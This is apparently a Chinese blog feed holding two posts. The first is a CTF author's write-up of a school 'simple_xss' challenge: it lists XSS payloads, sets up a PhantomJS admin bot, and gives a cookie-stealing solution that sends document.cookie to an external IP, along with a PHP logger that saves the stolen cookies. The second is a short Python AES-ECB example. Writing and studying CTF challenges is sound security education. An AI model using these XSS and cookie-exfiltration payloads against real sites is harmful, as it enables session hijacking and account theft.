    <content type="html"><![CDATA[<h1 id="记ctf校赛simple-xss出题"><a href="#记ctf校赛simple-xss出题" class="headerlink" title="记ctf校赛simple_xss出题"></a>记ctf校赛simple_xss出题</h1><p>这篇文章也拖了半年才发，主要是硬盘坏了，原本的博客文件丢失，新搭了子博客，可以发出来了。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。<br>一般用在如下地方:</p><ol><li>窃取用户信息，如cookie，token，账号密码等。</li><li>劫持流量实现恶意跳转</li></ol><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><h3 id="XSS攻击载荷"><a href="#XSS攻击载荷" class="headerlink" title="XSS攻击载荷"></a>XSS攻击载荷</h3><p>以下所有标签的<code>&gt;</code>都可以用<code>//</code>代替，例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p><h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;       &lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</code></pre><h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><pre><code>&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//</code></pre><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><pre><code>&lt;img  src=1  οnerrοr=alert(&quot;xss&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</code></pre><h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><pre><code>&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;</code></pre><h2 id="xss-bot"><a href="#xss-bot" class="headerlink" title="xss_bot"></a>xss_bot</h2><p>xss bot就是代替管理员去完成点击页面的任务，bot需要能够执行js，事情的本质是我们需要一个浏览器内核来解析js.xss bot一般会用selenium+webdriver</p><h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium是用来控制webdriver的接口的.</p><p>Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Firefox，Safari，Chrome，Opera等。</p><p>使用python爬虫调用selenium来模拟正常用户访问浏览器.<br>最新版selenium已经放弃PhantomJS了，selenium版本降级安装</p><pre><code>pip install selenium==2.48.0</code></pre><h3 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h3><p>chrome和firefox的webdriver都有一个特点，就是需要桌面,我们搭建题目在docker环境中会有问题，<br>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持无图形化，而且不需要浏览器支持。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>第一种方式</p><pre><code>apt-get install phantomjs需要加但是因为这样安装的不全，再python执行的时候，会报跟json编码有关的错。sudo apt-get install nodejssudo apt-get install nodejs-legacysudo apt-get install npmsudo npm -g install phantomjs-prebuilt  可以这样安装一个完整的环境</code></pre><p>第二种方式：</p><pre><code>wget http://npm.taobao.org/mirrors/phantomjs/phantomjs-2.1.1-linux-x86_64.tar.bz2tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2sudo cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/</code></pre><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><pre><code class="python">from selenium import webdriverimport time#要想调用键盘按键,鼠标操作需要引入keys包from selenium.webdriver.common.keys import Keys#创建PhantomJS浏览器对象driver = webdriver.PhantomJS()#driver = webdriver.PhantomJS(&#39;/usr/bin/phantomjs&#39;)#加载网站页面driver.get(&quot;http://127.0.0.1:5000/login.html&quot;)#找到页面input输入标签并填充文本内容admindriver.find_element_by_id(&#39;username&#39;).send_keys(&quot;admin&quot;)driver.find_element_by_id(&#39;password&#39;).send_keys(&quot;123456&quot;)  #输入帐号密码登录网站#By Name 找到name=login的按钮并模拟点击data = driver.find_element_by_name(&#39;login&#39;).click()time.sleep(1)#管理员登录状态访问存在xss的页面driver.get(&quot;http://127.0.0.1:5000/home.php&quot;)driver.quit()   </code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>简单的xss，没有任何过滤，不过实际测试时双引号会被过滤，在留言处插入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>弹窗成功，接下来就是打admin的cookie，可以选择xss平台也可以自己写，这里贴上cchan的payload供大家参考.</p><pre><code class="html">&lt;script src=//xxx.xx.xxx.xxx/cookie.js&gt;&lt;/script&gt;</code></pre><pre><code class="js">var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://106.15.194.242/cookie.php?&#39; + document.cookie);xhr.send();</code></pre><pre><code class="php">&lt;?phpheader(&#39;Access-Control-Allow-Origin: *&#39;);file_put_contents(&#39;cookie.txt&#39;, $_SERVER[&#39;QUERY_STRING&#39;].&quot;\n&quot;, FILE_APPEND);</code></pre><p>出题时没考虑到搅屎，admin被插入跳转后，后面的就渲染不出来了，不得不重置数据库。还有一点是为了区分用户和admin bot，我写了$_SERVER[‘HTTP_REFERER’]，有跳转的视为正常用户进入home.php,无跳转且cookie为admin就直接输出flag,所以如果大家直接进入admin的界面，需要把referer清空。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 aes实现</title>
    <link href="/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/"/>
    <url>/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>python-3.6.5</p><pre><code>pip install pycryptodome#Python36\Lib\site-packages\crypto =&gt;Python36\Lib\site-packages\Crypto  不更改导入包会报错</code></pre><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><pre><code class="python">from Crypto.Cipher import AESimport base64def add_to_16(par):    par = par.encode(&#39;gbk&#39;) #先将字符串类型数据转换成字节型数据    while len(par) % 16 != 0: #对字节型数据进行长度判断        par += b&#39;\x00&#39; #如果字节型数据长度不是16倍整数就进行 补充    return pardef encrypt(text,key):    mode = AES.MODE_ECB    aes = AES.new(add_to_16(key), mode)    cipher = aes.encrypt(add_to_16(text))    return base64.encodebytes(cipher).decode().strip()def decrypt(text,key):    mode = AES.MODE_ECB    text = base64.decodebytes(text.encode(&#39;gbk&#39;))    aes = AES.new(add_to_16(key), mode)    plaintext = aes.decrypt(text)    return plaintext.decode(&#39;gbk&#39;).strip(&#39;\0&#39;)if __name__ == &#39;__main__&#39;:    e = encrypt(&quot;晨曦远&quot;,&quot;123456&quot;)    print(&quot;加密:&quot;, e)    d=decrypt(e,&quot;123456&quot;)    print(&quot;解密:&quot;,d)</code></pre><p>去在线网站加解密试试<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">在线aes加密解密</a></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
